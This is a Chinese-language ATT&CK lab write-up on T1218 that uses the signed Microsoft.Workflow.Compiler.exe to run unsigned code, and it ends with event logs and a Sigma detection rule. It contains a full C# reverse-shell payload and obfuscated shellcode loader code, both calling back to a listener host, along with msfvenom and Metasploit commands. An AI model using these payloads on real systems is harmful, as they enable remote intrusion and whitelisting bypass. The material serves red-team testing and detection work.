# T1218-001-win-基于白名单Compiler.exe执行payload

## 来自ATT&CK的描述

许多软件开发相关的实用程序可用于执行各种形式的代码用以协助开发、调试和逆向工程。这些实用程序通常可以使用合法证书进行签名。签名后，它们就可以在系统上执行，并通过可信的进程代理执行恶意代码，从而有效地绕过应用白名单防御解决方案。

## 测试案例

 Microsoft.Workflow.Comiler.exe是.NET Framework默认自带的一个实用工具，用户能够以XOML工作流文件的形式提供一个序列化工作流来执行任意未签名的代码。

Microsoft.Workflow.Comiler.exe需要两个命令行参数，第一个参数必须是一个XML文件（由一个序列化CompilerInput对象构成）的路径，第二个参数则是写入序列化编译结果的文件路径。

说明：Microsoft.Workflow.Compiler.exe所在路径没有被系统添加PATH环境变量中，因此，Microsoft.Workflow.Compiler命令无法识别。

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

win7默认位置：

`C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe`

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe`

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：windows server 2012

### 方法1

#### POC.xml

```xml
<?xml version="1.0" encoding="utf‐8"?>

<CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema‐instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler"

<files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">

<d2p1:string>add.tcp</d2p1:string>

</files>

<parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">

<assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />

<compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />

<coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></coreAssemblyFileName>

<embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />

<evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />

<generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</generateExecutable>

<generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">true</generateInMemory>

<includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</includeDebugInformation>

<linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />

<mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />

<outputName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></outputName>

<tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />

<treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</treatWarningsAsErrors>

<warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">‐1</warningLevel>

<win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />

<d2p1:checkTypes>false</d2p1:checkTypes>

<d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>

<d2p1:compilerOptions i:nil="true" />

<d2p1:generateCCU>false</d2p1:generateCCU>

<d2p1:languageToUse>CSharp</d2p1:languageToUse>

<d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" />

<d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" />

<d2p1:mtInfo i:nil="true" />

<d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" />

</parameters>

</CompilerInput>
```

#### add.tcp

```c#
using System;

using System.Text;

using System.IO;

using System.Diagnostics;

using System.ComponentModel;

using System.Net;

using System.Net.Sockets;

using System.Workflow.Activities;

public class Program : SequentialWorkflowActivity

{

static StreamWriter streamWriter;

public Program()

{

using(TcpClient client = new TcpClient("192.168.126.146", 4444))

{

using(Stream stream = client.GetStream())

{

using(StreamReader rdr = new StreamReader(stream))

{

streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();

p.StartInfo.FileName = "cmd.exe";

p.StartInfo.CreateNoWindow = true;

p.StartInfo.UseShellExecute = false;

p.StartInfo.RedirectStandardOutput = true;

p.StartInfo.RedirectStandardInput = true;

p.StartInfo.RedirectStandardError = true;

p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);

p.Start();

p.BeginOutputReadLine();

while(true)

{

strInput.Append(rdr.ReadLine());

p.StandardInput.WriteLine(strInput);

strInput.Remove(0, strInput.Length);

}

}

}

}

}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)

{

StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))

{

try

{

strOutput.Append(outLine.Data);

streamWriter.WriteLine(strOutput);

streamWriter.Flush();

}

catch (Exception err) { }

}

}

}
```

#### 设置监听

```bash
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.126.146
msf exploit(multi/handler) > set lport 4444
msf exploit(multi/handler) > exploit
```

#### 靶机执行payload

```dos
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe poc.xml add.tcp
```

#### 查看会话

进程意外终止，未获得会话，利用方法2进行测试。

### 方法2

#### msf生成shellcode

```bash
msfvenom  -p windows/x64/shell/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp
```

```cs
using System;

using System.Workflow.Activities;

using System.Net;

using System.Net.Sockets;

using System.Runtime.InteropServices;

using System.Threading;

class yrDaTlg : SequentialWorkflowActivity {

[DllImport("kernel32")] private static extern IntPtr VirtualAlloc(UInt32 rCfMkmxRSAakg,UInt32 qjRsrljIMB, UInt32 peXiTuE, UInt32 AkpADfOOAVBZ);

[DllImport("kernel32")] public static extern bool VirtualProtect(IntPt rDStOGXQMMkP, uint CzzIpcuQppQSTBJ, uint JCFImGhkRqtwANx, out uint exgVp Sg);

[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 eisuQbXKYbAvA, UInt32 WQATOZaFz, IntPtr AEGJQOn,IntPtr SYcfyeeSgPl, UInt32 ZSheqBwKtDf, ref UInt32 SZtdSB);

[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr KqJNFlHpsKOV, UInt32 EYBOArlCLAM);

public yrDaTlg() {

byte[] QWKpWKhcs =

{0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,
0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,
0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,
0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,
0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x7e,0x92,0x41,0x54,0x49,0x89,0xe4,
0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,
0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,
0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,
0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,
0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,
0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,
0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,
0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,
0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,
0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,
0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,
0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

IntPtr AmnGaO = VirtualAlloc(0, (UInt32)QWKpWKhcs.Length, 0x3000, 0x04);

Marshal.Copy(QWKpWKhcs, 0, (IntPtr)(AmnGaO), QWKpWKhcs.Length);

IntPtr oXmoNUYvivZlXj = IntPtr.Zero; UInt32 XVXTOi = 0; IntPtr pAeCTf wBS = IntPtr.Zero;

uint BnhanUiUJaetgy;

bool iSdNUQK = VirtualProtect(AmnGaO, (uint)0x1000, (uint)0x20, out BnhanUiUJaetgy);

oXmoNUYvivZlXj = CreateThread(0, 0, AmnGaO, pAeCTfwBS, 0, ref XVXTOi);

WaitForSingleObject(oXmoNUYvivZlXj, 0xFFFFFFFF);}

}
```

#### 执行监听

```bash
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.126.146
msf exploit(multi/handler) > set lport 4444
msf exploit(multi/handler) > exploit
```

#### 执行payload

```dos
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe poc.xml 1.cs
```

#### 接受session

进程意外终止，未获得会话。

## 测试留痕

```log
事件ID： 4688
进程信息: #方法1
新进程 ID:0xb18
新进程名称:C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe
令牌提升类型:TokenElevationTypeDefault (1)
创建者进程 ID:0xaa0
进程命令行:C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe  poc.xml add.tcp

事件ID： 4688
进程信息: #方法2
新进程 ID:0x804
新进程名称:C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
令牌提升类型:TokenElevationTypeDefault (1)
创建者进程 ID:0xe8
进程命令行:C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe  poc.xml 1.cs
```

## 检测规则/思路

### sigma规则

```yml
title: Microsoft Compiler
status: experimental
description: 检测Microsoft工作流编译器的调用，该编译器可能允许执行任意无符号代码
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.t1218
references:
    - https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image: '*\Microsoft.Workflow.Compiler.exe'
    condition: selection
fields:
    - CommandLine
    - ParentCommandLine
falsepositives:
    - Legitimate MWC use (unlikely in modern enterprise environments)
level: high
```

### 建议

无具体检测规则，可根据进程创建事件4688/1（进程名称、命令行）进行监控。本监控方法需要自行安装配置审核策略Sysmon。

## 相关TIP
[[T1218-003-win-基于Cmstp.exe执行Payload(白名单)]]
[[T1218-004-win-基于Installutil.exe执行payload(白名单)]]
[[T1218-005-win-基于Mshta.exe执行payload(白名单)]]
[[T1218-007-win-基于Msiexec.exe执行Payload(白名单)]]
[[T1218-008-win-基于Odbcconf.exe执行Payload(白名单)]]
[[T1218-009-win-基于Regasm.exe执行payload(白名单)]]
[[T1218-010-win-基于Regsvr32执行payload(白名单)]]
[[T1218-011-win-基于Rundll32.exe执行payload(白名单)]]
[[T1218-011-win-基于URL.dll执行payload(白名单)]]
[[T1218-011-win-通过Rundll32的异常网络链接]]
[[T1218-win-基于Atbroker.exe执行恶意载荷(白名单)]]

## 参考推荐

MITRE-ATT&CK-T1218-001

<https://attack.mitre.org/techniques/T1218/001/>

基于白名单Compiler.exe执行payload第六季

<https://micro8.gitbook.io/micro8/contents-1/71-80/76-ji-yu-bai-ming-dan-compiler.exe-zhi-hang-payload-di-liu-ji>

远控免杀专题(43)-白名单Compiler.exe执行payload

<http://sec.nmask.cn/article_content?a_id=1b5c0f6a2e669c7605d42fd88f3f90fb>
